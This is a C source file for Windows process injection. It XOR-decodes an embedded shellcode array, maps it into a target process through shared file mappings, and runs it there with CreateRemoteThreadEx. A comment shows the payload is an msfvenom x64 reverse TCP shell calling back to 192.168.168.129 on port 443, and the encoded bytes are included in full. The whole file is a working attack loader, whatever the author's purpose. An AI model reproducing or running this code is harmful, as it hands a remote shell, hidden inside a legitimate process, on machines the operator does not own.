#include "header.h"
#pragma comment(lib, "onecore.lib")

#define KEY "FHTW"

// Process Injection 
BOOL Inject(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSize) {

	BOOL bState = TRUE;
	HANDLE hFile = NULL; 
	PVOID pLocalAddress = NULL; 
	PVOID pRemoteAddress = NULL;
	HANDLE hThread = NULL; 
	DWORD dwThreadId = NULL; 

	// Create File mapping
	hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sSize, NULL); 
	if (!hFile) {
		PRINT_ERROR("CreateFileMappingW"); 
		bState = FALSE;
		goto CLEANUP; 
	}
	OKAY("[ 0x%p ] Created file mapping.", hFile); 

	// Map view of payload into local process address space
	pLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sSize); 
	if (!pLocalAddress) {
		PRINT_ERROR("MapViewOfFile"); 
		bState = FALSE;
		goto CLEANUP; 
	}
	OKAY("[ 0x%p ] Mapped payload into local process address space.", pLocalAddress); 

	// Decrypt payload 
	SIZE_T sKeyLength = strlen(KEY);
	for (int i = 0; i < sSize; i++) {
		pShellcode[i] ^= KEY[i % sKeyLength];
	}
	OKAY("[ 0x%p ] Decoded payload with key \"%s\".", pShellcode, KEY);

	// Copy memory to the local address 
	RtlCopyMemory(pLocalAddress, pShellcode, sSize); 

	// Map view of payload into target process address space
	pRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE); 
	if (!pRemoteAddress) {
		PRINT_ERROR("MapViewOfFile2"); 
		bState = FALSE;
		goto CLEANUP; 
	}
	OKAY("[ 0x%p ] Mapped payload into target process address space.", pRemoteAddress); 

	// Create new thread
	hThread = CreateRemoteThreadEx(hProcess, NULL, NULL, pRemoteAddress, NULL, NULL, NULL, &dwThreadId); 
	if (!hThread) {
		PRINT_ERROR("CreateRemoteThreadEx"); 
		bState = FALSE;
		goto CLEANUP; 
	}
	OKAY("[ 0x%p ] [ %d ] Thread created.", hThread, dwThreadId); 

	// Wait for execution
	WaitForSingleObject(hThread, INFINITE); 

CLEANUP:

	if (hFile) {
		CloseHandle(hFile); 
	}

	if (pLocalAddress) {
		if (!UnmapViewOfFile(pLocalAddress)) {
			PRINT_ERROR("UnmapViewOfFile"); 
			bState = FALSE;
		}
	}

	if (pRemoteAddress) {
		if (!UnmapViewOfFile2(hProcess, pRemoteAddress, NULL)) {
			PRINT_ERROR("UnmapViewOfFile2"); 
			bState = FALSE; 
		}
	}

	return bState;
}

int main(int argc, char* argv[]) {

	DWORD dwPid = NULL;
	HANDLE hProcess = NULL;

	// msfvenom - p windows/x64/shell_reverse_tcp LHOST=192.168.168.129 LPORT=443 EXITFUNC=thread -a x64 --platform windows -f raw -o rev.bin
	// python3 encoder.py
	unsigned char pShellcode[] = {
		0xBA,0x00,0xD7,0xB3,0xB6,0xA0,0x94,0x57,0x46,0x48,0x15,0x06,0x07,0x18,0x06,
		0x06,0x10,0x00,0x65,0x85,0x23,0x00,0xDF,0x05,0x26,0x00,0xDF,0x05,0x5E,0x00,
		0xDF,0x05,0x66,0x00,0xDF,0x25,0x16,0x00,0x5B,0xE0,0x0C,0x02,0x19,0x66,0x8F,
		0x00,0x65,0x97,0xEA,0x74,0x35,0x2B,0x44,0x64,0x74,0x16,0x87,0x81,0x59,0x16,
		0x47,0x89,0xB6,0xBA,0x14,0x09,0x05,0x1F,0xCD,0x1A,0x74,0xDC,0x04,0x74,0x1C,
		0x56,0x96,0xC3,0xD4,0xDF,0x46,0x48,0x54,0x1F,0xC3,0x88,0x20,0x30,0x0E,0x49,
		0x84,0x07,0xCD,0x00,0x4C,0x13,0xCD,0x08,0x74,0x1E,0x47,0x98,0xB7,0x01,0x0E,
		0xB7,0x9D,0x16,0xCD,0x7C,0xDC,0x1F,0x47,0x9E,0x19,0x66,0x8F,0x00,0x65,0x97,
		0xEA,0x09,0x95,0x9E,0x4B,0x09,0x55,0x96,0x7E,0xA8,0x21,0xA6,0x0A,0x4B,0x18,
		0x73,0x4E,0x0D,0x6D,0x86,0x33,0x90,0x0C,0x13,0xCD,0x08,0x70,0x1E,0x47,0x98,
		0x32,0x16,0xCD,0x44,0x1C,0x13,0xCD,0x08,0x48,0x1E,0x47,0x98,0x15,0xDC,0x42,
		0xC0,0x1C,0x56,0x96,0x09,0x0C,0x16,0x1E,0x16,0x0D,0x0D,0x07,0x10,0x15,0x0E,
		0x07,0x12,0x1C,0xD4,0xAA,0x68,0x15,0x05,0xB9,0xA8,0x0C,0x16,0x1F,0x12,0x1C,
		0xDC,0x54,0xA1,0x03,0xA8,0xB9,0xB7,0x09,0x1E,0xF8,0x3F,0x27,0x65,0x19,0x7B,
		0x66,0x57,0x46,0x09,0x02,0x1E,0xCF,0xAE,0x1C,0xD6,0xAA,0xE8,0x55,0x57,0x46,
		0x01,0xDD,0xB2,0x0F,0xF4,0x56,0x57,0x47,0xF3,0x94,0xFF,0xEE,0xC9,0x15,0x03,
		0x0F,0xC1,0xB0,0x1B,0xCF,0xB9,0x15,0xED,0x0A,0x3F,0x72,0x50,0xB9,0x9D,0x18,
		0xDE,0xAC,0x20,0x55,0x56,0x46,0x48,0x0D,0x16,0xFC,0x61,0xD4,0x3C,0x46,0xB7,
		0x81,0x07,0x16,0x05,0x65,0x9E,0x0B,0x79,0x94,0x1F,0xB9,0x88,0x1C,0xDE,0x84,
		0x00,0xAB,0x97,0x0E,0xC1,0x95,0x16,0xFC,0xA2,0x5B,0x88,0xA6,0xB7,0x81,0x1F,
		0xCF,0x8F,0x3E,0x47,0x07,0x10,0x18,0xDE,0xA4,0x00,0xDD,0xAE,0x07,0xF2,0xCD,
		0xF2,0x32,0x29,0xAB,0x82,0x0E,0xC9,0x90,0x17,0x44,0x48,0x54,0x1E,0xFE,0x2B,
		0x39,0x33,0x46,0x48,0x54,0x57,0x46,0x09,0x04,0x16,0x16,0x00,0xDD,0xB5,0x11,
		0x1F,0x03,0x1A,0x77,0x88,0x3E,0x5A,0x1F,0x09,0x04,0xB5,0xBA,0x2E,0x93,0x13,
		0x62,0x1C,0x55,0x56,0x0E,0xC5,0x10,0x73,0x5E,0x8E,0x54,0x3F,0x0E,0xC1,0xB2,
		0x01,0x16,0x09,0x04,0x16,0x16,0x09,0x04,0x1E,0xB9,0x88,0x15,0x07,0x0F,0xB7,
		0x9C,0x1A,0xCF,0x89,0x18,0xDE,0x87,0x09,0xEE,0x2E,0x8A,0x77,0xD2,0xA8,0x93,
		0x00,0x65,0x85,0x0E,0xB7,0x9E,0xDC,0x48,0x09,0xEE,0x5F,0xC1,0x55,0x34,0xA8,
		0x93,0xF3,0xB4,0x4A,0x6C,0x42,0x15,0xED,0xE0,0xDD,0xE9,0xCA,0xB9,0x9D,0x1C,
		0xD4,0x82,0x60,0x68,0x51,0x3A,0x42,0xD4,0xAC,0xA6,0x3D,0x51,0xEC,0x01,0x5B,
		0x26,0x38,0x2C,0x48,0x0D,0x16,0xCF,0x92,0xAB,0x82
	};

	// Handle command line arguments
	if (argc < 2) {
		printf("Usage: %s <pid>\n", argv[0]);
		return EXIT_FAILURE;
	}
	dwPid = atoi(argv[1]);

	// Get handle to remote process
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hProcess) {
		PRINT_ERROR("OpenProcess");
		return EXIT_FAILURE;
	}
	OKAY("[ 0x%p ] [ %d ] Process opened.", hProcess, dwPid);

	// Inject 
	if (!Inject(hProcess, pShellcode, sizeof(pShellcode))) {
		PRINT_ERROR("Inject");
		return EXIT_FAILURE;
	}

	if (hProcess) {
		CloseHandle(hProcess);
	}

	return EXIT_SUCCESS;
}